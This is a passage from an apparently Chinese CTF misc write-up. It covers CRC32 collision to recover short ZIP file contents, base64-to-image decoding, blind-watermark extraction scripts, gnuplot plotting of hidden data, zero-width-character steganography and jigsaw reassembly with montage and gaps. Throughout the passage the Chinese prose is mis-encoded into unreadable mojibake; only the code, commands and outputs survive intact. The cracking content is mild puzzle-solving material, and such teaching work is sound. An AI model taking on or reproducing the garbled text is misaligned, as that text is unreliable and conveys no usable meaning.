python">cG90<br>aW9u<br>Z2Vu<br>YjEy<br>Mw==<br></code></pre></td></tr></table></figure><p>åœ¨è¿›è¡Œå‹ç¼©åŒ…å†…ä¸ºäº”å­—èŠ‚æˆ–å…­å­—èŠ‚çˆ†ç ´æ—¶ï¼Œä½¿ç”¨ä¸Šé¢çš„è„šæœ¬éœ€è¦çš„æ—¶é—´å¤ªé•¿äº†ï¼Œåœ¨githubä¸Šæ‰¾åˆ°ä¸¤ä¸ªæ–°çš„è„šæœ¬</p><p><strong>é¡¹ç›®1</strong>ï¼š<br><a href="https://github.com/theonlypwner/crc32.git">https://github.com/theonlypwner/crc32.git</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">â””â”€$ python crc32.py reverse 0x3dacac6b                                                 <br>4 bytes: &#123;0x47, 0x18, 0x87, 0xce&#125;<br>verification checksum: 0x3dacac6b (OK)<br>5 bytes: DCr4m (OK)<br>6 bytes: 1QhloU (OK)<br>6 bytes: 3mmr6H (OK)<br>6 bytes: 49Gqqk (OK)<br>6 bytes: 5Uumn6 (OK)<br>6 bytes: 8Gpbyp (OK)<br>6 bytes: 9G1Sbi (OK)<br>6 bytes: EHZxWz (OK)<br>6 bytes: F93jxv (OK)<br>6 bytes: I6mk_a (OK)<br>6 bytes: KGEHkt (OK)<br>6 bytes: O3d8oG (OK)<br>6 bytes: Uy1jKa (OK)<br>6 bytes: XJju5k (OK)<br>6 bytes: Zvoklv (OK)<br>6 bytes: a3H1hL (OK)<br>6 bytes: g6AbXj (OK)<br>6 bytes: kHvqPq (OK)<br>6 bytes: lQqOzZ (OK)<br>6 bytes: vwW0Z8 (OK)    <br></code></pre></td></tr></table></figure><p>å½“ç„¶ç”±äºcrc32.pyä¸­å­—ç¬¦é›†ä¸­åªåŒ…å«<code>[A-Za-z0-9_]</code>,é‡åˆ°ç‰¹æ®Šå­—ç¬¦å¯èƒ½æ— æ³•ç¢°æ’å‡ºæ¥ï¼Œå¯ä»¥å¯¹è„šæœ¬è¿›è¡Œæ”¹è¿›ï¼ŒæŠŠå­—ç¬¦é›†æ¢æˆdicï¼Œå³å¯æ‰“å°å­—ç¬¦ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">dic=<span class="hljs-keyword">string</span>.printable<br><span class="hljs-comment">#0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~ </span><br></code></pre></td></tr></table></figure><p>ç„¶ååœ¨è¿›è¡ŒCRC32ç¢°æ’ï¼Œå¯ä»¥å¾—åˆ°æ›´å¤šçš„ç»“æœ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash">â”Œâ”€â”€(kaliã‰¿kali)-[~/æ¡Œé¢/Python/CRC32]<br>â””â”€$ python3 crc32.py reverse 0x3dacac6b <br>4 bytes: &#123;0x47, 0x18, 0x87, 0xce&#125;<br>verification checksum: 0x3dacac6b (OK)<br>5 bytes: (0_0) (OK)<br>5 bytes: DCr4m (OK)<br>6 bytes: 1QhloU (OK)<br>6 bytes: 3mmr6H (OK)<br>6 bytes: 49Gqqk (OK)<br>6 bytes: 5Uumn6 (OK)<br>6 bytes: 7ips7+ (OK)<br>6 bytes: 8Gpbyp (OK)<br>6 bytes: 9G1Sbi (OK)<br>6 bytes: EHZxWz (OK)<br>6 bytes: F93jxv (OK)<br>6 bytes: I6mk_a (OK)<br>6 bytes: J+wTt) (OK)<br>6 bytes: K+6eo0 (OK)<br>6 bytes: KGEHkt (OK)<br>6 bytes: N/jUuJ (OK)<br>6 bytes: O/+dnS (OK)<br>6 bytes: O3d8oG (OK)<br>6 bytes: TX.K94 (OK)<br>6 bytes: Uy1jKa (OK)<br>6 bytes: XJju5k (OK)<br>6 bytes: YJ+D.r (OK)<br>6 bytes: Zvoklv (OK)<br>6 bytes: a3H1hL (OK)<br>6 bytes: dG(pwf (OK)<br>6 bytes: e7U0i/ (OK)<br>6 bytes: fgb2/o (OK)<br>6 bytes: g6AbXj (OK)<br>6 bytes: kHvqPq (OK)<br>6 bytes: kT9-Qe (OK)<br>6 bytes: lQqOzZ (OK)<br>6 bytes: vwW0Z8 (OK)<br></code></pre></td></tr></table></figure><p><strong>é¡¹ç›®2</strong>ï¼š<br><a href="https://github.com/kmyk/zip-crc-cracker">https://github.com/kmyk/zip-crc-cracker</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">â””â”€$ python3 crack.py key.zip<br>reading zip files...<br>file found: key.zip / key.txt: crc = 0x3dacac6b, size = 5<br>compiling...<br>searching...<br>crc found: 0x3dacac6b: <span class="hljs-string">&quot;yR&gt;\x5c5&quot;</span><br>crc found: 0x3dacac6b: <span class="hljs-string">&quot;DCr4m&quot;</span><br>crc found: 0x3dacac6b: <span class="hljs-string">&quot;X\x0c.5y&quot;</span><br>crc found: 0x3dacac6b: <span class="hljs-string">&quot;(0_0)&quot;</span><br>crc found: 0x3dacac6b: <span class="hljs-string">&quot;\x09nOYe&quot;</span><br><span class="hljs-keyword">done</span><br><br>key.zip / key.txt : <span class="hljs-string">&#x27;yR&gt;\\5&#x27;</span><br>key.zip / key.txt : <span class="hljs-string">&#x27;DCr4m&#x27;</span><br>key.zip / key.txt : <span class="hljs-string">&#x27;X\x0c.5y&#x27;</span><br>key.zip / key.txt : <span class="hljs-string">&#x27;(0_0)&#x27;</span><br>key.zip / key.txt : <span class="hljs-string">&#x27;\tnOYe</span><br></code></pre></td></tr></table></figure><h2 id="17-Baseè½¬å›¾ç‰‡"><a href="#17-Baseè½¬å›¾ç‰‡" class="headerlink" title="17. Baseè½¬å›¾ç‰‡"></a>17. Baseè½¬å›¾ç‰‡</h2><p>æ‰“å¼€flag.txtï¼Œå‘ç°<code>data:image/png;base64</code>å¼€å¤´ï¼Œ<br><img src="https://img-blog.csdnimg.cn/20201220191131642.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åœ¨çº¿ç½‘ç«™<a href="http://tool.chinaz.com/tools/imgtobase/">Base64è½¬å›¾ç‰‡</a><br><img src="https://img-blog.csdnimg.cn/20201220191344451.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="18-ç›²æ°´å°"><a href="#18-ç›²æ°´å°" class="headerlink" title="18. ç›²æ°´å°"></a>18. ç›²æ°´å°</h2><h3 id="BlindWaterMark"><a href="#BlindWaterMark" class="headerlink" title="BlindWaterMark"></a>BlindWaterMark</h3><p>ä¸‹è½½åœ°å€ï¼š<a href="https://github.com/chishaxie/BlindWaterMark">https://github.com/chishaxie/BlindWaterMark</a></p><p>éœ€è¦å®‰è£…cv2åº“ï¼Œpip install opencv-python</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">python2 -m pip install opencv-python<br></code></pre></td></tr></table></figure><p>åˆæˆç›²æ°´å°</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python bwm.py encode hui.png wm.png hui_with_wm.png<br></code></pre></td></tr></table></figure><p>æå–å›¾ä¸­çš„ç›²æ°´å°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">python2 bwm.py decode <span class="hljs-number">2.</span>png <span class="hljs-number">1.</span>png  flag.png<br>æˆ–è€…<br>python3 bwmforpy3.py decode <span class="hljs-number">2.</span>png <span class="hljs-number">1.</span>png flag.png<br><span class="hljs-comment">#2.png     --original &lt;åŸå§‹å›¾åƒæ–‡ä»¶&gt;</span><br><span class="hljs-comment">#1.png     --image &lt;å›¾åƒæ–‡ä»¶&gt; </span><br><span class="hljs-comment">#flag.png  --result &lt;ç»“æœæ–‡ä»¶&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210215182146821.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="é¢‘åŸŸç›²æ°´å°"><a href="#é¢‘åŸŸç›²æ°´å°" class="headerlink" title="é¢‘åŸŸç›²æ°´å°"></a>é¢‘åŸŸç›²æ°´å°</h3><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://xz.aliyun.com/t/1875/#toc-9">https://xz.aliyun.com/t/1875/#toc-9</a><br> <strong>[GWCTF2019]huyao</strong><br>é¢‘åŸŸç›²æ°´å°è„šæœ¬ï¼š BlindWaterMarkplus.py </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># coding=utf-8</span><br>import cv2   <br>import numpy as np<br>import random<br>import os<br>from argparse import ArgumentParser<br>ALPHA = 5<br>def build_parser():<br>    parser = ArgumentParser()<br>    parser.add_argument(<span class="hljs-string">&#x27;--original&#x27;</span>, dest=<span class="hljs-string">&#x27;ori&#x27;</span>, required=True)<br>    parser.add_argument(<span class="hljs-string">&#x27;--image&#x27;</span>, dest=<span class="hljs-string">&#x27;img&#x27;</span>, required=True)<br>    parser.add_argument(<span class="hljs-string">&#x27;--result&#x27;</span>, dest=<span class="hljs-string">&#x27;res&#x27;</span>, required=True)<br>    parser.add_argument(<span class="hljs-string">&#x27;--alpha&#x27;</span>, dest=<span class="hljs-string">&#x27;alpha&#x27;</span>, default=ALPHA)<br>    <span class="hljs-built_in">return</span> parser<br>def main():<br>    parser = build_parser()<br>    options = parser.parse_args()<br>    ori = options.ori<br>    img = options.img<br>    res = options.res<br>    alpha = options.alpha<br>    <span class="hljs-keyword">if</span> not os.path.isfile(ori):<br>        parser.error(<span class="hljs-string">&quot;original image %s does not exist.&quot;</span> % ori)<br>    <span class="hljs-keyword">if</span> not os.path.isfile(img):<br>        parser.error(<span class="hljs-string">&quot;image %s does not exist.&quot;</span> % img)<br>    decode(ori, img, res, alpha)<br>def decode(ori_path, img_path, res_path, alpha):<br>    ori = cv2.imread(ori_path)<br>    img = cv2.imread(img_path)<br>    ori_f = np.fft.fft2(ori)<br>    img_f = np.fft.fft2(img)<br>    height, width = ori.shape[0], ori.shape[1]<br>    watermark = (ori_f - img_f) / alpha<br>    watermark = np.real(watermark)<br>    res = np.zeros(watermark.shape)<br>    random.seed(height + width)<br>    x = range(height / 2)<br>    y = range(width)<br>    random.shuffle(x)<br>    random.shuffle(y)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(height / 2):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(width):<br>            res[x[i]][y[j]] = watermark[i][j]<br>    cv2.imwrite(res_path, res, [int(cv2.IMWRITE_JPEG_QUALITY), 100])<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br>python BlindWaterMarkplus.py --original huyao.png --image stillhuyao.png --result res.png<br></code></pre></td></tr></table></figure><p>ç„¶åï¼Œä½¿ç”¨å‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python BlindWaterMarkplus.py --original huyao.png --image stillhuyao.png --result res.png<br></code></pre></td></tr></table></figure><p>å¾—åˆ°res.png<br><img src="https://img-blog.csdnimg.cn/20210321202802305.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="JAVAç›²æ°´å°"><a href="#JAVAç›²æ°´å°" class="headerlink" title="JAVAç›²æ°´å°"></a>JAVAç›²æ°´å°</h3><p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/ww23/BlindWaterMark/releases">https://github.com/ww23/BlindWaterMark/releases</a></p><p>æ‰§è¡Œå‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar BlindWatermark.jar decode -c bingbing.jpg decode.jpg<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210408214526121.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="19-gnuplotç”»å›¾"><a href="#19-gnuplotç”»å›¾" class="headerlink" title="19. gnuplotç”»å›¾"></a>19. gnuplotç”»å›¾</h2><p><strong>[BUUCTF]- æ¢…èŠ±é¦™ä¹‹è‹¦å¯’æ¥</strong><br>ç”¨010 editoræ‰“å¼€å›¾ç‰‡ï¼Œåœ¨æ–‡ä»¶å°¾å‘ç°å¤§é‡æ•°æ®<br><img src="https://img-blog.csdnimg.cn/20210215193630106.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¤åˆ¶åˆ°Notepad++ï¼Œä½¿ç”¨ <a href="https://blog.csdn.net/anialy/article/details/8183108"> hexè½¬ascllæ’ä»¶</a><br><img src="https://img-blog.csdnimg.cn/2021041219410026.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è½¬æ¢ä¸ºgnuplotèƒ½è¯†åˆ«çš„å†…å®¹<br><img src="https://img-blog.csdnimg.cn/20210412194159948.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä½¿ç”¨gnuplotå·¥å…·ç”»å›¾</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">plot <span class="hljs-string">&quot;m.txt&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210412194421242.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ‰«ç å³å¯å¾—åˆ°flag</p><p>çœ‹äº†å…¶ä»–äººçš„è§£æ³•ï¼Œå¤§å¸ˆå‚…çš„<a href="https://blog.csdn.net/weixin_45485719/article/details/107427378">pythonè„šæœ¬</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;m.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> h:<br>    h = h.read()<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;ascii.txt&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>) <span class="hljs-keyword">as</span> a:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(h), <span class="hljs-number">2</span>):<br>        tmp = <span class="hljs-string">&#x27;0x&#x27;</span>+h[i]+h[i+<span class="hljs-number">1</span>]<br>        tmp = <span class="hljs-built_in">int</span>(tmp, base=<span class="hljs-number">16</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">chr</span>(tmp) != <span class="hljs-string">&#x27;(&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">chr</span>(tmp) != <span class="hljs-string">&#x27;)&#x27;</span>:<br>            a.write(<span class="hljs-built_in">chr</span>(tmp))<br><br><br>x, y = np.loadtxt(<span class="hljs-string">&#x27;ascii.txt&#x27;</span>, delimiter=<span class="hljs-string">&#x27;,&#x27;</span>, unpack=<span class="hljs-literal">True</span>)<br>plt.plot(x, y, <span class="hljs-string">&#x27;.&#x27;</span>)<br>plt.show()<br><br></code></pre></td></tr></table></figure><h2 id="20-é›¶å®½å­—ç¬¦åŠ å¯†"><a href="#20-é›¶å®½å­—ç¬¦åŠ å¯†" class="headerlink" title="20. é›¶å®½å­—ç¬¦åŠ å¯†"></a>20. é›¶å®½å­—ç¬¦åŠ å¯†</h2><p> [UTCTF2020]zero<br>ä¸‹è½½é™„ä»¶ï¼Œä½¿ç”¨vimå‘½ä»¤å¯ä»¥çœ‹åˆ°é›¶å®½å­—ç¬¦<br><img src="https://img-blog.csdnimg.cn/20210215194854868.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åœ¨çº¿ç½‘ç«™ï¼Œ<a href="https://330k.github.io/misc_tools/unicode_steganography.html">é›¶å®½åº¦å­—ç¬¦éšå†™è§£å¯†</a><br><img src="https://img-blog.csdnimg.cn/20210215194959537.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="21-gapsæ‹¼å›¾"><a href="#21-gapsæ‹¼å›¾" class="headerlink" title="21. gapsæ‹¼å›¾"></a>21. gapsæ‹¼å›¾</h2><p><strong>BUUCTFï¼š[MRCTF2020]ä¸çœ ä¹‹å¤œ</strong></p><p>ä¸‹è½½é™„ä»¶ï¼Œåˆ å»ä¸å¿…è¦çš„æ–‡ä»¶ï¼ŒæŸ¥çœ‹æ–‡ä»¶å¤¹å±æ€§ï¼Œä¸€å…±120å¼ å›¾ç‰‡<br><img src="https://img-blog.csdnimg.cn/20210209214055358.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å†æŸ¥çœ‹å›¾ç‰‡å±æ€§ï¼Œåˆ†è¾¨ç‡ä¸º200x100<br><img src="https://img-blog.csdnimg.cn/20210209214221765.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>1.ä½¿ç”¨ <code>montage</code> å‘½ä»¤å°†ç¢ç‰‡åˆæˆä¸ºä¸€å¼ å›¾ç‰‡,å¾—åˆ°flag.jpg</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">montage *jpg -tile 10x12 -geometry 200x100+0+0 flag.jpg<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210209213858493.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>2 .å°†ç”Ÿæˆçš„flag.jpgæ‹–åˆ°gapsçš„binç›®å½•ä¸‹æ‰§è¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 gaps --image=flag.jpg --generations=40 --population=120 --size=100<br><span class="hljs-comment">#populationä¸ºå›¾ç‰‡æ•°é‡ï¼Œsizeä¸ºæ¯ä¸ªå›¾ç‰‡é«˜åº¦</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210209213715280.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><strong>[ç¬¬ä¸€å±ŠSXC CTF]æ‹¼å›¾</strong></p><p>å°†100å¼ ç¢ç‰‡åˆæˆï¼Œæ¯ä¸ªå›¾ç‰‡åˆ†è¾¨ç‡ä¸º192x120ï¼Œç”Ÿæˆçš„out.pngåˆ†è¾¨ç‡ä¸º1920x1200</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">montage *png -tile 10x10 -geometry 192x120+0+0 out.png<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210209232712628.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä¿®æ”¹æ‹¼æ¥åçš„å›¾ç‰‡å¤§å°ï¼Œæ”¹ä¸º1200x1200<br><img src="https://img-blog.csdnimg.cn/2021020923275864.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿˜åŸæ‹¼å›¾</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 gaps --image=out.png --generation=30 --population=300 --size=120<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210209232354216.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="22-åå…­è¿›åˆ¶æ–‡ä»¶å­—èŠ‚å·¦å³ç¿»è½¬"><a href="#22-åå…­è¿›åˆ¶æ–‡ä»¶å­—èŠ‚å·¦å³ç¿»è½¬" class="headerlink" title="22.åå…­è¿›åˆ¶æ–‡ä»¶å­—èŠ‚å·¦å³ç¿»è½¬"></a>22.åå…­è¿›åˆ¶æ–‡ä»¶å­—èŠ‚å·¦å³ç¿»è½¬</h2><p><strong>[2020é‡‘ç›¾ä¿¡å®‰æ¯]-æˆ‘å’Œåå…­æœ‰ä¸ªçº¦å®š</strong><br>å†…å®¹ï¼šé“¾æ¥: <a href="https://pan.baidu.com/s/1LJiUaVyANUZBN4bb1SHiCQ">https://pan.baidu.com/s/1LJiUaVyANUZBN4bb1SHiCQ</a> å¯†ç : u5sr</p><p>ä¸‹è½½é™„ä»¶ï¼Œå¾—åˆ°ababab.pngå’Œflag.zip<br>010æ‰“å¼€ababab.pngï¼Œå‘ç°å…¶å®æ˜¯GIFï¼Œä¸è¿‡æ²¡ä»€ä¹ˆç”¨ï¼Œæ‹–åˆ°æœ€åï¼Œçœ‹åˆ°keyis7034735377307244<br><img src="https://img-blog.csdnimg.cn/20201220215029846.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>åå…­è¿›åˆ¶è½¬å­—ç¬¦ä¸²ï¼Œå¾—åˆ°p4sSw0rDï¼Œè¿™å°±æ˜¯å‹ç¼©åŒ…å¯†ç è§£å‹æ–‡ä»¶flag.txtå’Œsplice.txt<br>flag.txtå†…å®¹ä¸º</p><p><img src="https://img-blog.csdnimg.cn/20201220215035717.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å‘ç°ç¬¬ä¸€è¡Œ<code>FF D8 FF 